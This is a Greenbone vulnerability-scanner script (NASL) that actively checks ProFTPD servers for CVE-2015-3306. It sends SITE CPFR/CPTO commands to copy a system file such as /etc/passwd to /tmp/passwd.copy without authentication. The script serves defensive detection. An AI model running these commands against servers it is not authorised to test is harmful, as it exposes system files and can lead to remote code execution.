# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:proftpd:proftpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105254");
  script_version("2025-09-24T05:39:03+0000");
  script_tag(name:"last_modification", value:"2025-09-24 05:39:03 +0000 (Wed, 24 Sep 2025)");
  script_tag(name:"creation_date", value:"2015-04-13 18:15:12 +0200 (Mon, 13 Apr 2015)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2015-3306");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ProFTPD 'mod_copy' Unauthenticated Copying Of Files Via SITE CPFR/CPTO Vulnerability (Apr 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("FTP");
  script_dependencies("gb_proftpd_consolidation.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("proftpd/ftp/detected");

  script_tag(name:"summary", value:"ProFTPD is prone to an unauthenticated copying of files
  vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to copy /etc/passwd to /tmp/passwd.copy with SITE
  CPFR/CPTO command.");

  script_tag(name:"impact", value:"Under some circumstances this could result in remote code
  execution.");

  script_tag(name:"solution", value:"Ask the vendor for an update.");

  script_xref(name:"URL", value:"http://bugs.proftpd.org/show_bug.cgi?id=4169");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("traversal_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"ftp" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

files = traversal_files("linux");

foreach pattern( keys( files ) ) {

  file = files[pattern];

  send( socket:soc, data:'site cpfr /' +file + '\n' );
  recv = recv( socket:soc, length:128 );

  if( "350 File or directory exists" >!< recv )
    continue;

  send( socket:soc, data:'site cpto /tmp/passwd.copy\n' );
  recv = recv( socket:soc, length:128 );

  if( "250 Copy successful" >< recv ) {
    close( soc );
    security_message( data: "The target was found to be vulnerable", port:port );
    exit( 0 );
  }
}

close( soc );

exit( 99 );
